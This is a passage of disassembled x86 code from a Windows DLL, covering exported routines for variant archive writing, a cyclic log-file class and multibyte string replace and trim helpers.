		and	[ebp+var_10], 0
		push	1
		lea	ecx, [ebp+var_1]
		push	ecx
		mov	ecx, esi
		mov	[ebp+var_1], 0Bh
		call	dword ptr [eax+8]
		test	eax, eax
		jnz	short loc_6AF3AB44
		push	offset aCarchiveWri_19 ; "CArchive::Write(LPCVARIANT) :	WriteEx()"...
		call	sub_6AF3102E
		pop	ecx

loc_6AF3AB32:				; CODE XREF: Ordinal343+C0j
		push	dword ptr [esi+0Ch]
		mov	eax, [esi]
		push	dword ptr [esi+8]
		mov	ecx, esi
		call	dword ptr [eax+0Ch]
		jmp	loc_6AF3ABCD
; ---------------------------------------------------------------------------

loc_6AF3AB44:				; CODE XREF: Ordinal343+38j
		and	[ebp+var_8], 0
		push	2
		lea	ecx, [ebp+var_28]
		call	Ordinal680
		lea	eax, [ebp+var_8]
		push	eax
		push	[ebp+arg_0]
		lea	ecx, [ebp+var_28]
		call	Ordinal372
		test	eax, eax
		jnz	short loc_6AF3AB6C
		push	offset aCarchiveWri_20 ; "CArchive::Write(LPCVARIANT) :	dummyArch"...
		jmp	short loc_6AF3AB9F
; ---------------------------------------------------------------------------

loc_6AF3AB6C:				; CODE XREF: Ordinal343+76j
		mov	eax, [esi]
		push	4
		lea	ecx, [ebp+var_8]
		push	ecx
		mov	ecx, esi
		call	dword ptr [eax+8]
		test	eax, eax
		jnz	short loc_6AF3AB84
		push	offset aCarchiveWri_19 ; "CArchive::Write(LPCVARIANT) :	WriteEx()"...
		jmp	short loc_6AF3AB9F
; ---------------------------------------------------------------------------

loc_6AF3AB84:				; CODE XREF: Ordinal343+8Ej
		and	[ebp+var_C], 0
		lea	eax, [ebp+var_C]
		push	eax
		push	[ebp+arg_0]
		mov	ecx, esi
		call	Ordinal372
		test	eax, eax
		jnz	short loc_6AF3ABAF
		push	offset aCarchiveWri_21 ; "CArchive::Write(LPCVARIANT) :	WriteVari"...

loc_6AF3AB9F:				; CODE XREF: Ordinal343+7Dj
					; Ordinal343+95j
		call	sub_6AF3102E
		pop	ecx
		lea	ecx, [ebp+var_28]
		call	Ordinal681
		jmp	short loc_6AF3AB32
; ---------------------------------------------------------------------------

loc_6AF3ABAF:				; CODE XREF: Ordinal343+ABj
		push	edi
		mov	edi, [ebp+var_C]
		lea	ecx, [ebp+var_28]
		add	edi, 5
		mov	[ebp+var_10], 1
		call	Ordinal681
		add	[esi+8], edi
		pop	edi
		adc	dword ptr [esi+0Ch], 0

loc_6AF3ABCD:				; CODE XREF: Ordinal343+52j
		mov	eax, [ebp+var_10]

loc_6AF3ABD0:				; CODE XREF: Ordinal343+1Cj
		pop	esi
		leave
		retn	4
Ordinal343	endp

; Exported entry 363.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal363
Ordinal363	proc near		; DATA XREF: .rdata:off_6AF66098o

arg_0		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		push	esi
		push	[ebp+arg_0]
		mov	esi, ecx
		call	Ordinal343
		test	eax, eax
		jnz	short loc_6AF3ABFC
		push	offset dword_6AF62908
		lea	eax, [ebp+arg_0]
		push	eax
		mov	[ebp+arg_0], offset off_6AF57464
		call	_CxxThrowException
; ---------------------------------------------------------------------------

loc_6AF3ABFC:				; CODE XREF: Ordinal363+10j
		mov	eax, esi
		pop	esi
		pop	ebp
		retn	4
Ordinal363	endp

; Exported entry 390.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal390
Ordinal390	proc near		; CODE XREF: Ordinal383+9p
					; Ordinal409+72p ...

var_C		= byte ptr -0Ch

		push	ebp
		mov	ebp, esp
		sub	esp, 0Ch
		push	esi
		mov	esi, ecx
		push	0
		push	0FFFFFFFFh
		lea	eax, [esi+4Ch]
		push	eax
		lea	ecx, [ebp+var_C]
		call	Ordinal1228
		lea	ecx, [esi+8]
		call	Ordinal774
		lea	ecx, [ebp+var_C]
		call	Ordinal1230
		pop	esi
		leave
		retn
Ordinal390	endp

; Exported entry 391.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal391
Ordinal391	proc near		; DATA XREF: .rdata:off_6AF66098o

var_C		= byte ptr -0Ch

		push	ebp
		mov	ebp, esp
		sub	esp, 0Ch
		push	esi
		push	edi
		mov	esi, ecx
		xor	edi, edi
		push	edi
		push	0FFFFFFFFh
		lea	eax, [esi+4Ch]
		push	eax
		lea	ecx, [ebp+var_C]
		call	Ordinal1228
		push	edi		; int
		push	edi		; lDistanceToMove
		lea	ecx, [esi+8]
		call	Ordinal789
		test	eax, eax
		jnz	short loc_6AF3AC65
		push	offset aCautocyclelogf ; "CAutoCycleLogFile::Clear() : m_File.Set"...
		call	sub_6AF3102E
		pop	ecx
		jmp	short loc_6AF3AC68
; ---------------------------------------------------------------------------

loc_6AF3AC65:				; CODE XREF: Ordinal391+27j
		xor	edi, edi
		inc	edi

loc_6AF3AC68:				; CODE XREF: Ordinal391+34j
		lea	ecx, [ebp+var_C]
		call	Ordinal1230
		mov	eax, edi
		pop	edi
		pop	esi
		leave
		retn
Ordinal391	endp

; Exported entry 395.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal395
Ordinal395	proc near		; DATA XREF: .rdata:off_6AF66098o

var_C		= byte ptr -0Ch

		push	ebp
		mov	ebp, esp
		sub	esp, 0Ch
		push	esi
		mov	esi, ecx
		push	0
		push	0FFFFFFFFh
		lea	eax, [esi+4Ch]
		push	eax
		lea	ecx, [ebp+var_C]
		call	Ordinal1228
		lea	ecx, [esi+8]
		call	Ordinal1137
		lea	ecx, [ebp+var_C]
		mov	esi, eax
		call	Ordinal1230
		mov	eax, esi
		pop	esi
		leave
		retn
Ordinal395	endp

; Exported entry 396.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal396
Ordinal396	proc near		; DATA XREF: .rdata:off_6AF66098o

var_C		= byte ptr -0Ch

		push	ebp
		mov	ebp, esp
		sub	esp, 0Ch
		push	esi
		mov	esi, ecx
		push	0
		push	0FFFFFFFFh
		lea	eax, [esi+4Ch]
		push	eax
		lea	ecx, [ebp+var_C]
		call	Ordinal1228
		lea	ecx, [esi+8]
		call	Ordinal236
		lea	ecx, [ebp+var_C]
		mov	esi, eax
		call	Ordinal1230
		mov	eax, esi
		pop	esi
		leave
		retn
Ordinal396	endp

; Exported entry 397.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal397
Ordinal397	proc near		; CODE XREF: Ordinal410+1Cp
					; DATA XREF: .rdata:off_6AF66098o

var_C		= byte ptr -0Ch

		push	ebp
		mov	ebp, esp
		sub	esp, 0Ch
		push	esi
		push	edi
		mov	esi, ecx
		push	0
		push	0FFFFFFFFh
		lea	eax, [esi+4Ch]
		push	eax
		lea	ecx, [ebp+var_C]
		call	Ordinal1228
		lea	ecx, [esi+8]
		call	Ordinal788
		lea	ecx, [ebp+var_C]
		mov	esi, eax
		mov	edi, edx
		call	Ordinal1230
		mov	edx, edi
		pop	edi
		mov	eax, esi
		pop	esi
		leave
		retn
Ordinal397	endp

; Exported entry 398.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal398
Ordinal398	proc near		; DATA XREF: .rdata:off_6AF66098o

var_C		= byte ptr -0Ch
arg_0		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		sub	esp, 0Ch
		push	esi
		mov	esi, ecx
		push	0
		push	0FFFFFFFFh
		lea	eax, [esi+4Ch]
		push	eax
		lea	ecx, [ebp+var_C]
		call	Ordinal1228
		mov	eax, [ebp+arg_0]
		lea	ecx, [ebp+var_C]
		mov	[esi+48h], eax
		call	Ordinal1230
		pop	esi
		leave
		retn	4
Ordinal398	endp

; Exported entry 399.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal399
Ordinal399	proc near		; DATA XREF: .rdata:off_6AF66098o

var_C		= byte ptr -0Ch

		push	ebp
		mov	ebp, esp
		sub	esp, 0Ch
		push	esi
		mov	esi, ecx
		push	0
		push	0FFFFFFFFh
		lea	eax, [esi+4Ch]
		push	eax
		lea	ecx, [ebp+var_C]
		call	Ordinal1228
		mov	esi, [esi+48h]
		lea	ecx, [ebp+var_C]
		call	Ordinal1230
		mov	eax, esi
		pop	esi
		leave
		retn
Ordinal399	endp

; Exported entry 400.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal400
Ordinal400	proc near		; DATA XREF: .rdata:off_6AF66098o

var_C		= byte ptr -0Ch
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch

		push	ebp
		mov	ebp, esp
		sub	esp, 0Ch
		push	esi
		mov	esi, ecx
		push	0
		push	0FFFFFFFFh
		lea	eax, [esi+4Ch]
		push	eax
		lea	ecx, [ebp+var_C]
		call	Ordinal1228
		mov	eax, [ebp+arg_0]
		mov	[esi+38h], eax
		mov	eax, [ebp+arg_4]
		lea	ecx, [ebp+var_C]
		mov	[esi+3Ch], eax
		call	Ordinal1230
		pop	esi
		leave
		retn	8
Ordinal400	endp

; Exported entry 401.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal401
Ordinal401	proc near		; DATA XREF: .rdata:off_6AF66098o

var_C		= byte ptr -0Ch

		push	ebp
		mov	ebp, esp
		sub	esp, 0Ch
		push	esi
		push	edi
		mov	esi, ecx
		push	0
		push	0FFFFFFFFh
		lea	eax, [esi+4Ch]
		push	eax
		lea	ecx, [ebp+var_C]
		call	Ordinal1228
		mov	edi, [esi+38h]
		mov	esi, [esi+3Ch]
		lea	ecx, [ebp+var_C]
		call	Ordinal1230
		mov	eax, edi
		pop	edi
		mov	edx, esi
		pop	esi
		leave
		retn
Ordinal401	endp

; Exported entry 402.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal402
Ordinal402	proc near		; DATA XREF: .rdata:off_6AF66098o

var_C		= byte ptr -0Ch
arg_0		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		sub	esp, 0Ch
		push	esi
		mov	esi, ecx
		push	0
		push	0FFFFFFFFh
		lea	eax, [esi+4Ch]
		push	eax
		lea	ecx, [ebp+var_C]
		call	Ordinal1228
		mov	eax, [ebp+arg_0]
		lea	ecx, [ebp+var_C]
		mov	[esi+44h], eax
		call	Ordinal1230
		pop	esi
		leave
		retn	4
Ordinal402	endp

; Exported entry 403.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal403
Ordinal403	proc near		; DATA XREF: .rdata:off_6AF66098o

var_C		= byte ptr -0Ch

		push	ebp
		mov	ebp, esp
		sub	esp, 0Ch
		push	esi
		mov	esi, ecx
		push	0
		push	0FFFFFFFFh
		lea	eax, [esi+4Ch]
		push	eax
		lea	ecx, [ebp+var_C]
		call	Ordinal1228
		mov	esi, [esi+44h]
		lea	ecx, [ebp+var_C]
		call	Ordinal1230
		mov	eax, esi
		pop	esi
		leave
		retn
Ordinal403	endp

; Exported entry 404.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal404
Ordinal404	proc near		; DATA XREF: .rdata:off_6AF66098o

var_C		= byte ptr -0Ch
arg_0		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		sub	esp, 0Ch
		push	esi
		mov	esi, ecx
		push	0
		push	0FFFFFFFFh
		lea	eax, [esi+4Ch]
		push	eax
		lea	ecx, [ebp+var_C]
		call	Ordinal1228
		mov	eax, [ebp+arg_0]
		lea	ecx, [ebp+var_C]
		mov	[esi+40h], eax
		call	Ordinal1230
		pop	esi
		leave
		retn	4
Ordinal404	endp

; Exported entry 405.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal405
Ordinal405	proc near		; DATA XREF: .rdata:off_6AF66098o

var_C		= byte ptr -0Ch

		push	ebp
		mov	ebp, esp
		sub	esp, 0Ch
		push	esi
		mov	esi, ecx
		push	0
		push	0FFFFFFFFh
		lea	eax, [esi+4Ch]
		push	eax
		lea	ecx, [ebp+var_C]
		call	Ordinal1228
		mov	esi, [esi+40h]
		lea	ecx, [ebp+var_C]
		call	Ordinal1230
		mov	eax, esi
		pop	esi
		leave
		retn
Ordinal405	endp

; Exported entry 394.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal394
Ordinal394	proc near		; DATA XREF: .rdata:off_6AF66098o

var_C		= byte ptr -0Ch

		push	ebp
		mov	ebp, esp
		sub	esp, 0Ch
		push	esi
		mov	esi, ecx
		push	0
		push	0FFFFFFFFh
		lea	eax, [esi+4Ch]
		push	eax
		lea	ecx, [ebp+var_C]
		call	Ordinal1228
		mov	esi, [esi+2Ch]
		lea	ecx, [ebp+var_C]
		call	Ordinal1230
		mov	eax, esi
		pop	esi
		leave
		retn
Ordinal394	endp

; Exported entry 383.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal383
Ordinal383	proc near		; CODE XREF: sub_6AF3AF33+3p
					; Ordinal1199+1Cj
					; DATA XREF: ...
		push	esi
		mov	esi, ecx
		mov	dword ptr [esi], offset	off_6AF583D4
		call	Ordinal390
		lea	ecx, [esi+4Ch]
		call	Ordinal1279
		lea	ecx, [esi+30h]
		call	sub_6AF3789B
		lea	ecx, [esi+2Ch]
		call	sub_6AF3789B
		lea	ecx, [esi+28h]
		call	sub_6AF3789B
		lea	ecx, [esi+24h]
		call	sub_6AF3789B
		lea	ecx, [esi+8]
		pop	esi
		jmp	Ordinal770
Ordinal383	endp

; Exported entry 382.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal382
Ordinal382	proc near		; CODE XREF: Ordinal1198+3p
					; DATA XREF: .rdata:off_6AF66098o
		push	esi
		mov	esi, ecx
		lea	ecx, [esi+8]
		mov	dword ptr [esi], offset	off_6AF583D4
		call	Ordinal768
		lea	ecx, [esi+24h]
		call	sub_6AF318C3
		lea	ecx, [esi+28h]
		call	sub_6AF318C3
		lea	ecx, [esi+2Ch]
		call	sub_6AF318C3
		lea	ecx, [esi+30h]
		call	sub_6AF318C3
		xor	ecx, ecx
		xor	eax, eax
		inc	eax
		mov	[esi+34h], ecx
		mov	[esi+38h], ecx
		mov	[esi+3Ch], ecx
		mov	[esi+48h], ecx
		lea	ecx, [esi+4Ch]
		mov	[esi+40h], eax
		mov	[esi+44h], eax
		call	Ordinal1278
		lea	eax, [esi+14h]
		push	eax		; lpSystemTime
		call	ds:GetLocalTime
		mov	eax, esi
		pop	esi
		retn
Ordinal382	endp


; =============== S U B	R O U T	I N E =======================================


; int __thiscall sub_6AF3AF33(void *, char)
sub_6AF3AF33	proc near		; DATA XREF: .rdata:off_6AF583D4o

arg_0		= byte ptr  4

		push	esi
		mov	esi, ecx
		call	Ordinal383
		test	[esp+4+arg_0], 1
		jz	short loc_6AF3AF49
		push	esi		; void *
		call	??3@YAXPAX@Z	; operator delete(void *)
		pop	ecx

loc_6AF3AF49:				; CODE XREF: sub_6AF3AF33+Dj
		mov	eax, esi
		pop	esi
		retn	4
sub_6AF3AF33	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __stdcall	sub_6AF3AF4F(int, size_t Size)
sub_6AF3AF4F	proc near		; CODE XREF: sub_6AF3B24F+1Bp
					; sub_6AF3B274+Dp

var_4		= dword	ptr -4
arg_0		= dword	ptr  8
Size		= dword	ptr  0Ch

		push	ebp
		mov	ebp, esp
		push	ecx
		push	ebx
		push	esi
		mov	esi, [ebp+arg_0]
		mov	ebx, ecx
		mov	eax, [ebx]
		push	edi
		mov	edi, [eax-0Ch]
		sub	esi, eax
		mov	eax, [ebp+Size]
		add	eax, edi
		push	eax
		mov	[ebp+var_4], eax
		call	sub_6AF31911
		cmp	esi, edi
		ja	short loc_6AF3AF78
		add	esi, eax
		jmp	short loc_6AF3AF7B
; ---------------------------------------------------------------------------

loc_6AF3AF78:				; CODE XREF: sub_6AF3AF4F+23j
		mov	esi, [ebp+arg_0]

loc_6AF3AF7B:				; CODE XREF: sub_6AF3AF4F+27j
		push	[ebp+Size]	; Size
		add	eax, edi
		push	esi		; Src
		push	eax		; Dst
		call	memcpy
		add	esp, 0Ch
		push	[ebp+var_4]
		mov	ecx, ebx
		call	sub_6AF3155D
		pop	edi
		pop	esi
		pop	ebx
		leave
		retn	8
sub_6AF3AF4F	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_6AF3AF9B	proc near		; CODE XREF: Ordinal406+23p
					; Ordinal406+2Dp ...

var_C		= dword	ptr -0Ch
var_8		= dword	ptr -8
var_1		= byte ptr -1
arg_0		= byte ptr  8
arg_4		= byte ptr  0Ch

		push	ebp
		mov	ebp, esp
		sub	esp, 0Ch
		mov	al, [ebp+arg_0]
		push	edi
		xor	edi, edi
		cmp	al, [ebp+arg_4]
		mov	[ebp+var_C], ecx
		mov	[ebp+var_8], edi
		jz	short loc_6AF3B00C
		push	ebx
		push	esi
		mov	esi, [ecx]
		mov	ebx, [esi-0Ch]
		cmp	ebx, edi
		mov	[ebp+var_1], 0
		jle	short loc_6AF3B00A

loc_6AF3AFC1:				; CODE XREF: sub_6AF3AF9B+5Ej
		mov	cl, [ebp+arg_0]
		lea	eax, [edi+esi]
		cmp	[eax], cl
		jnz	short loc_6AF3AFEB
		cmp	[ebp+var_1], 0
		jnz	short loc_6AF3AFE0
		mov	ecx, [ebp+var_C]
		push	ebx
		mov	[ebp+var_1], 1
		call	sub_6AF31911
		mov	esi, eax

loc_6AF3AFE0:				; CODE XREF: sub_6AF3AF9B+34j
		mov	cl, [ebp+arg_4]
		inc	[ebp+var_8]
		lea	eax, [edi+esi]
		mov	[eax], cl

loc_6AF3AFEB:				; CODE XREF: sub_6AF3AF9B+2Ej
		push	eax		; unsigned __int8 *
		call	ds:_mbsinc
		mov	edi, eax
		sub	edi, esi
		cmp	edi, ebx
		pop	ecx
		jl	short loc_6AF3AFC1
		cmp	[ebp+var_1], 0
		jz	short loc_6AF3B00A
		mov	ecx, [ebp+var_C]
		push	ebx
		call	sub_6AF3155D

loc_6AF3B00A:				; CODE XREF: sub_6AF3AF9B+24j
					; sub_6AF3AF9B+64j
		pop	esi
		pop	ebx

loc_6AF3B00C:				; CODE XREF: sub_6AF3AF9B+15j
		mov	eax, [ebp+var_8]
		pop	edi
		leave
		retn	8
sub_6AF3AF9B	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __stdcall	sub_6AF3B014(char *Str,	void *Src)
sub_6AF3B014	proc near		; CODE XREF: Ordinal406+5Cp

var_24		= dword	ptr -24h
var_20		= dword	ptr -20h
var_1C		= dword	ptr -1Ch
var_18		= dword	ptr -18h
var_14		= dword	ptr -14h
var_10		= dword	ptr -10h
var_C		= dword	ptr -0Ch
var_8		= dword	ptr -8
Size		= dword	ptr -4
Str		= dword	ptr  8
Src		= dword	ptr  0Ch

		push	ebp
		mov	ebp, esp
		sub	esp, 24h
		push	esi
		push	edi
		xor	edi, edi
		cmp	[ebp+Str], edi
		mov	esi, ecx
		mov	[ebp+var_18], esi
		jz	short loc_6AF3B036
		push	[ebp+Str]	; Str
		call	strlen
		pop	ecx
		mov	[ebp+var_8], eax
		jmp	short loc_6AF3B039
; ---------------------------------------------------------------------------

loc_6AF3B036:				; CODE XREF: sub_6AF3B014+12j
		mov	[ebp+var_8], edi

loc_6AF3B039:				; CODE XREF: sub_6AF3B014+20j
		cmp	[ebp+var_8], edi
		jnz	short loc_6AF3B045
		xor	eax, eax
		jmp	loc_6AF3B177
; ---------------------------------------------------------------------------

loc_6AF3B045:				; CODE XREF: sub_6AF3B014+28j
		cmp	[ebp+Src], edi
		jz	short loc_6AF3B058
		push	[ebp+Src]	; Str
		call	strlen
		pop	ecx
		mov	[ebp+Size], eax
		jmp	short loc_6AF3B05B
; ---------------------------------------------------------------------------

loc_6AF3B058:				; CODE XREF: sub_6AF3B014+34j
		mov	[ebp+Size], edi

loc_6AF3B05B:				; CODE XREF: sub_6AF3B014+42j
		mov	esi, [esi]
		mov	[ebp+var_10], edi
		mov	edi, [esi-0Ch]
		add	edi, esi
		cmp	esi, edi
		jnb	loc_6AF3B174
		push	ebx
		mov	ebx, ds:_mbsstr
		jmp	short loc_6AF3B07F
; ---------------------------------------------------------------------------

loc_6AF3B076:				; CODE XREF: sub_6AF3B014+75j
		mov	ecx, [ebp+var_8]
		inc	[ebp+var_10]
		lea	esi, [eax+ecx]

loc_6AF3B07F:				; CODE XREF: sub_6AF3B014+60j
					; sub_6AF3B014+8Cj
		push	[ebp+Str]	; unsigned __int8 *
		push	esi		; unsigned __int8 *
		call	ebx ; _mbsstr
		test	eax, eax
		pop	ecx
		pop	ecx
		jnz	short loc_6AF3B076
		test	esi, esi
		jz	short loc_6AF3B098
		push	esi		; Str
		call	strlen
		pop	ecx
		jmp	short loc_6AF3B09A
; ---------------------------------------------------------------------------

loc_6AF3B098:				; CODE XREF: sub_6AF3B014+79j
		xor	eax, eax

loc_6AF3B09A:				; CODE XREF: sub_6AF3B014+82j
		lea	esi, [esi+eax+1]
		cmp	esi, edi
		jb	short loc_6AF3B07F
		cmp	[ebp+var_10], 0
		jle	loc_6AF3B173
		mov	edi, [ebp+Size]
		sub	edi, [ebp+var_8]
		mov	eax, [ebp+var_18]
		imul	edi, [ebp+var_10]
		mov	eax, [eax]
		mov	esi, [eax-0Ch]
		add	edi, esi
		cmp	edi, esi
		mov	[ebp+var_14], esi
		mov	[ebp+var_20], edi
		mov	eax, edi
		jg	short loc_6AF3B0CE
		mov	eax, esi

loc_6AF3B0CE:				; CODE XREF: sub_6AF3B014+B6j
		mov	ecx, [ebp+var_18]
		push	eax
		call	sub_6AF31911
		lea	ecx, [eax+esi]
		mov	[ebp+var_1C], eax
		mov	[ebp+var_24], ecx
		cmp	eax, ecx
		jmp	short loc_6AF3B161
; ---------------------------------------------------------------------------

loc_6AF3B0E4:				; CODE XREF: sub_6AF3B014+150j
		push	[ebp+Str]	; unsigned __int8 *
		push	[ebp+var_C]	; unsigned __int8 *
		call	ebx ; _mbsstr
		mov	esi, eax
		test	esi, esi
		pop	ecx
		pop	ecx
		jz	short loc_6AF3B148

loc_6AF3B0F4:				; CODE XREF: sub_6AF3B014+12Fj
		mov	edi, [ebp+var_1C]
		mov	ecx, [ebp+var_8]
		mov	eax, [ebp+Size]
		sub	edi, esi
		sub	edi, ecx
		add	edi, [ebp+var_14]
		add	ecx, esi
		push	edi		; Size
		add	eax, esi
		push	ecx		; Src
		push	eax		; Dst
		call	ds:memmove
		push	[ebp+Size]	; Size
		push	[ebp+Src]	; Src
		push	esi		; Dst
		call	memcpy
		mov	eax, [ebp+Size]
		push	[ebp+Str]	; unsigned __int8 *
		add	eax, esi
		mov	[ebp+var_C], eax
		mov	eax, [ebp+Size]
		push	[ebp+var_C]	; unsigned __int8 *
		add	edi, esi
		mov	byte ptr [edi+eax], 0
		sub	eax, [ebp+var_8]
		add	[ebp+var_14], eax
		call	ebx ; _mbsstr
		mov	esi, eax
		add	esp, 20h
		test	esi, esi
		jnz	short loc_6AF3B0F4
		mov	edi, [ebp+var_20]

loc_6AF3B148:				; CODE XREF: sub_6AF3B014+DEj
		mov	esi, [ebp+var_C]
		test	esi, esi
		jz	short loc_6AF3B158
		push	esi		; Str
		call	strlen
		pop	ecx
		jmp	short loc_6AF3B15A
; ---------------------------------------------------------------------------

loc_6AF3B158:				; CODE XREF: sub_6AF3B014+139j
		xor	eax, eax

loc_6AF3B15A:				; CODE XREF: sub_6AF3B014+142j
		lea	eax, [esi+eax+1]
		cmp	eax, [ebp+var_24]

loc_6AF3B161:				; CODE XREF: sub_6AF3B014+CEj
		mov	[ebp+var_C], eax
		jb	loc_6AF3B0E4
		mov	ecx, [ebp+var_18]
		push	edi
		call	sub_6AF3155D

loc_6AF3B173:				; CODE XREF: sub_6AF3B014+92j
		pop	ebx

loc_6AF3B174:				; CODE XREF: sub_6AF3B014+53j
		mov	eax, [ebp+var_10]

loc_6AF3B177:				; CODE XREF: sub_6AF3B014+2Cj
		pop	edi
		pop	esi
		leave
		retn	8
sub_6AF3B014	endp


; =============== S U B	R O U T	I N E =======================================


; int __stdcall	sub_6AF3B17D(unsigned __int8 *)
sub_6AF3B17D	proc near		; CODE XREF: Ordinal406+Fp
					; Ordinal393+72p ...

arg_0		= dword	ptr  4

		push	ebx
		push	ebp
		mov	ebp, [esp+8+arg_0]
		test	ebp, ebp
		mov	ebx, ecx
		jz	short loc_6AF3B1D6
		cmp	byte ptr [ebp+0], 0
		jz	short loc_6AF3B1D6
		push	esi
		mov	esi, [ebx]
		mov	al, [esi]
		push	edi
		xor	edi, edi
		test	al, al
		jz	short loc_6AF3B1D4

loc_6AF3B19B:				; CODE XREF: sub_6AF3B17D+47j
		movzx	eax, al
		push	eax		; unsigned int
		push	ebp		; unsigned __int8 *
		call	ds:_mbschr
		test	eax, eax
		pop	ecx
		pop	ecx
		jz	short loc_6AF3B1B4
		test	edi, edi
		jnz	short loc_6AF3B1B6
		mov	edi, esi
		jmp	short loc_6AF3B1B6
; ---------------------------------------------------------------------------

loc_6AF3B1B4:				; CODE XREF: sub_6AF3B17D+2Dj
		xor	edi, edi

loc_6AF3B1B6:				; CODE XREF: sub_6AF3B17D+31j
					; sub_6AF3B17D+35j
		push	esi		; unsigned __int8 *
		call	ds:_mbsinc
		mov	esi, eax
		mov	al, [esi]
		test	al, al
		pop	ecx
		jnz	short loc_6AF3B19B
		test	edi, edi
		jz	short loc_6AF3B1D4
		sub	edi, [ebx]
		mov	ecx, ebx
		push	edi
		call	sub_6AF31C8E

loc_6AF3B1D4:				; CODE XREF: sub_6AF3B17D+1Cj
					; sub_6AF3B17D+4Bj
		pop	edi
		pop	esi

loc_6AF3B1D6:				; CODE XREF: sub_6AF3B17D+Aj
					; sub_6AF3B17D+10j
		pop	ebp
		mov	eax, ebx
		pop	ebx
		retn	4
sub_6AF3B17D	endp


; =============== S U B	R O U T	I N E =======================================


; int __stdcall	sub_6AF3B1DD(unsigned __int8 *)
sub_6AF3B1DD	proc near		; CODE XREF: Ordinal406+16p

arg_0		= dword	ptr  4

		push	ebx
		push	edi
		mov	edi, [esp+8+arg_0]
		test	edi, edi
		mov	ebx, ecx
		jz	short loc_6AF3B248
		cmp	byte ptr [edi],	0
		jz	short loc_6AF3B248
		push	esi
		mov	esi, [ebx]
		jmp	short loc_6AF3B20E
; ---------------------------------------------------------------------------

loc_6AF3B1F3:				; CODE XREF: sub_6AF3B1DD+35j
		movzx	eax, al
		push	eax		; unsigned int
		push	edi		; unsigned __int8 *
		call	ds:_mbschr
		test	eax, eax
		pop	ecx
		pop	ecx
		jz	short loc_6AF3B214
		push	esi		; unsigned __int8 *
		call	ds:_mbsinc
		pop	ecx
		mov	esi, eax

loc_6AF3B20E:				; CODE XREF: sub_6AF3B1DD+14j
		mov	al, [esi]
		test	al, al
		jnz	short loc_6AF3B1F3

loc_6AF3B214:				; CODE XREF: sub_6AF3B1DD+25j
		mov	eax, [ebx]
		cmp	esi, eax
		jz	short loc_6AF3B247
		push	dword ptr [eax-0Ch]
		mov	ecx, ebx
		sub	esi, eax
		call	sub_6AF31911
		mov	ecx, [ebx]
		mov	edi, [ecx-0Ch]
		sub	edi, esi
		lea	ecx, [edi+1]
		push	ecx		; Size
		lea	ecx, [eax+esi]
		push	ecx		; Src
		push	eax		; Dst
		call	ds:memmove
		add	esp, 0Ch
		push	edi
		mov	ecx, ebx
		call	sub_6AF3155D

loc_6AF3B247:				; CODE XREF: sub_6AF3B1DD+3Bj
		pop	esi

loc_6AF3B248:				; CODE XREF: sub_6AF3B1DD+Aj
					; sub_6AF3B1DD+Fj
		pop	edi
		mov	eax, ebx
		pop	ebx
		retn	4
sub_6AF3B1DD	endp


; =============== S U B	R O U T	I N E =======================================


; int __stdcall	sub_6AF3B24F(char *Str)
sub_6AF3B24F	proc near		; CODE XREF: Ordinal408+121p
					; Ordinal408+14Ep ...

Str		= dword	ptr  4

		push	esi
		mov	esi, [esp+4+Str]
		test	esi, esi
		push	edi
		mov	edi, ecx
		jnz	short loc_6AF3B25F
		xor	eax, eax
		jmp	short loc_6AF3B266
; ---------------------------------------------------------------------------

loc_6AF3B25F:				; CODE XREF: sub_6AF3B24F+Aj
		push	esi		; Str
		call	strlen
		pop	ecx

loc_6AF3B266:				; CODE XREF: sub_6AF3B24F+Ej
		push	eax		; Size
		push	esi		; int
		mov	ecx, edi
		call	sub_6AF3AF4F
		pop	edi
		pop	esi
		retn	4
sub_6AF3B24F	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF3B274	proc near		; CODE XREF: Ordinal408+12Cp
					; Ordinal408+137p ...

arg_0		= dword	ptr  4

		mov	eax, [esp+arg_0]
		mov	eax, [eax]
		push	esi
		push	dword ptr [eax-0Ch] ; Size
		mov	esi, ecx
		push	eax		; int
		call	sub_6AF3AF4F
		mov	eax, esi
		pop	esi
		retn	4
sub_6AF3B274	endp

; Exported entry 406.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal406
Ordinal406	proc near		; DATA XREF: .rdata:6AF583D8o
					; .rdata:6AF5F38Co ...

arg_0		= dword	ptr  4

		push	esi
		mov	esi, [esp+4+arg_0]
		push	edi
		mov	eax, offset dword_6AF583E4
		push	eax		; unsigned __int8 *
		push	eax		; unsigned __int8 *
		mov	ecx, esi
		call	sub_6AF3B17D
		mov	ecx, eax
		call	sub_6AF3B1DD
		push	20h
		pop	edi
		push	edi
		push	9
		mov	ecx, esi
		call	sub_6AF3AF9B
		push	edi
		push	7
		mov	ecx, esi
		call	sub_6AF3AF9B
		push	edi
		push	8
		mov	ecx, esi
		call	sub_6AF3AF9B
		push	edi
		push	0Ch
		mov	ecx, esi
		call	sub_6AF3AF9B
